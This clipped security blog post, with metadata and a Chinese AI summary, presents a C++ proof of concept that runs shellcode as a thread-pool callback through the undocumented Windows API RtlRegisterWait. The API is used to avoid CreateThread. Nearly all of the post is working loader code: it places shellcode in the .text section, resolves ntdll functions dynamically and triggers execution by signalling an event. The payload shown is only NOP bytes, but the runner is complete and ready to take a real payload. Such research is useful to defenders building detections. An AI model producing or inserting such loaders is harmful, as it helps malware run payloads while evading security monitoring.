---
title: RtlRegisterWait Shellcode Execution PoC
source: https://osandamalith.com/2025/10/18/rtlregisterwait-shellcode-execution-poc/?utm_source=rss&utm_medium=rss&utm_campaign=rtlregisterwait-shellcode-execution-poc
source_host: osandamalith.com
clip_date: 2026-10-26T10:23:43+08:00
trace_id: f2d36378-c891-4ae1-971d-221d04b5e46e
content_hash: cb845a10916aab97981af049daafa67217550dff200443409cea7d857adde1c5
status: synced
tags:
  - Windows逆向
  - 恶意样本
series: null
feed_source: Osanda·逆向/安全研究
ai_summary: RtlRegisterWait 是 ntdll 中未公开的线程池等待 API，可将其回调参数直接填入 shellcode 地址，通过信号事件触发执行，实现一种免 CreateThread 的 shellcode 运行方式。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 40575244-d011-8110-9a3c-f0c7878ed7e3
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> RtlRegisterWait 是 ntdll 中未公开的线程池等待 API，可将其回调参数直接填入 shellcode 地址，通过信号事件触发执行，实现一种免 CreateThread 的 shellcode 运行方式。
> 
> - **核心原理：** RtlRegisterWait（未文档化）向系统线程池注册一个等待项，当指定内核对象句柄变为有信号状态时，由线程池线程执行注册的回调函数，PoC 直接把 shellcode 当作回调传入。
> - **shellcode 存放：** 通过 `#pragma section(".text")` 与 `__declspec(allocate(".text"))` 将 shellcode（示例为 NOP 占位字节）放入自定义的 .text 节，避免落在数据节。
> - **执行流程：** 用 GetProcAddress 动态解析 RtlRegisterWait / RtlDeregisterWait；CreateEventW 创建自动重置事件；以 INFINITE 超时和 WT_EXECUTEONLYONCE 标志注册等待；SetEvent 触发事件后 shellcode 在线程池线程中执行。
> - **清理逻辑：** Sleep 等待回调执行完毕后调用 RtlDeregisterWait 注销等待项并 CloseHandle 关闭事件句柄。
> - **代码结构：** 通过函数指针 typedef 以 NTSTATUS(NTAPI) 签名声明 ntdll 原生 API，并用 NT_SUCCESS 宏检查各步骤的 NTSTATUS 返回值。

`RtlRegisterWait` is an undocumented Windows API that registers a callback function to be executed by a system managed thread pool when a specified object handle becomes signalled.

```cpp
/*
[*] RtlRegisterWait Shellcode Execution PoC 
[*] Author: Osanda Malith Jayathissa - @OsandaMalith
[*] www.osandamalith.com
[*] Date: 13/10/2025
*/

#include 
#include 
#include 

typedef NTSTATUS(NTAPI* RtlRegisterWait_t)(
    PHANDLE WaitHandle,
    HANDLE Handle,
    PVOID Callback,
    PVOID Context,
    ULONG Milliseconds,
    ULONG Flags
    );

typedef NTSTATUS(NTAPI* RtlDeregisterWait_t)(
    HANDLE WaitHandle
    );

#pragma section(".text")
__declspec(allocate(".text")) unsigned char shellcode[] = {
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
};

int main() {
    puts("[*] RtlRegisterWait Shellcode Execution PoC");
    puts("[*] Author: Osanda Malith Jayathissa - @OsandaMalith");
    puts("[*] www.osandamalith.com\n");

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    RtlRegisterWait_t RtlRegisterWait = (RtlRegisterWait_t)GetProcAddress(ntdll, "RtlRegisterWait");
    RtlDeregisterWait_t RtlDeregisterWait = (RtlDeregisterWait_t)GetProcAddress(ntdll, "RtlDeregisterWait");
  
    printf("[+] RtlRegisterWait at: 0x%p\n", RtlRegisterWait);
    printf("[+] Shellcode at: 0x%p\n\n", shellcode);

    // Create an event to wait on
    HANDLE hEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
    if (!hEvent) {
        printf("[-] CreateEvent failed: %d\n", GetLastError());
        return 1;
    }
    printf("[+] Event created: 0x%p\n", hEvent);

    // Registers a wait callback that executes when an object is signalled
    HANDLE hWait = NULL;
    auto status = RtlRegisterWait(
        &hWait,
        hEvent,
        shellcode,           // Shellcode as callback
        NULL,           
        INFINITE,       // Wait forever until signalled
        WT_EXECUTEONLYONCE
    );

    if (!NT_SUCCESS(status)) {
        printf("[-] RtlRegisterWait failed: 0x%X\n", status);
        CloseHandle(hEvent);
        return status;
    }

    printf("[+] Wait registered successfully\n");
    printf("[+] Shellcode registered as callback\n\n");
    printf("[*] Signaling event to trigger shellcode...\n");
    Sleep(500);  

    // Signal the event - this triggers the shellcode!
    if (!SetEvent(hEvent)) printf("[-] SetEvent failed: %d\n", GetLastError());
    else {
        printf("[+] Event signaled!\n");
        printf("[+] Shellcode should execute now...\n\n");
    }

    // Give the callback time to execute
    Sleep(1000);
    if (RtlDeregisterWait && hWait) RtlDeregisterWait(hWait);   
    CloseHandle(hEvent);

    return 0;
}
```
